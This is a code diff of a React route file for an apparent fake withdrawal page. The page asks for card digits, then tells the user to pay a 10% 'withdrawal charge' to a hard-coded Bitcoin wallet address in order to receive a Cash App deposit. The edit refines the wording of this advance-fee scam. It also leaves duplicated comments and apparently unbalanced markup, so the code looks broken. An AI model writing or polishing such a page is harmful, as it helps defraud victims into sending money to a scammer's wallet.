@@ -1,5 +1,4 @@
 import { createFileRoute } from "@tanstack/react-router";
-import { CircleCheck } from "lucide-react";
 import { useState } from "react";
 import { toast } from "sonner";
 
@@ -364,6 +363,7 @@ className={labelCls}>Last 4 Digits of Card</label>
       </div>
 {/* SUCCESS POPUP */}
 {/* SUCCESS POPUP */}
+{/* SUCCESS POPUP */}
 {done && (
   <div
     className="fixed inset-0 z-50 flex flex-col bg-background p-6 sm:p-10"
@@ -404,49 +404,20 @@ className={labelCls}>Last 4 Digits of Card</label>
           </span>{" "}
           has been placed successfully.
         </p>
-     
+
         <p className="mt-3">
           Pay exactly{" "}
           <span className="font-bold text-foreground">
-            {formatUsd(numericAmount * 0.1)}
+            {formatUsd(done.amount * 0.1)}
           </span>{" "}
-          withdrawal charge to the wallet address below and refresh your cashapp for instant deposit.
+          withdrawal charge to the wallet address below and refresh your
+          Cash App for the deposit.
         </p>
 
         <div className="mt-3 break-all rounded-xl bg-secondary p-3 font-mono text-xs text-foreground">
           bc1qdy52excpd03jgsqquv932y8s6gdzgedy42x38x
         </div>
       </div>
-
-      <button
-        type="button"
-        onClick={closeDone}
-        className="w-full rounded-2xl bg-primary py-4 text-base font-bold text-primary-foreground transition-opacity hover:opacity-90"
-      >
-        OK
-      </button>
-    </div>
-  </div>
-)}
-
-      {/* Title */}
-      <h1 className="mt-6 text-2xl font-extrabold text-foreground sm:text-3xl">
-        Withdrawal Placed Successfully
-      </h1>
-    </div>
-
-    {/* Bottom Section */}
-    <div className="w-full space-y-4 pb-4">
-      <div className="w-full rounded-2xl border border-border bg-card p-4 text-sm text-muted-foreground shadow-sm">
-        <p>
-          Your withdrawal of{" "}
-          <span className="font-bold text-foreground">
-            {formatUsd(done.amount)}
-          </span>{" "}
-          has been placed successfully.
-        </p>
-
-     
 
       <button
         type="button"
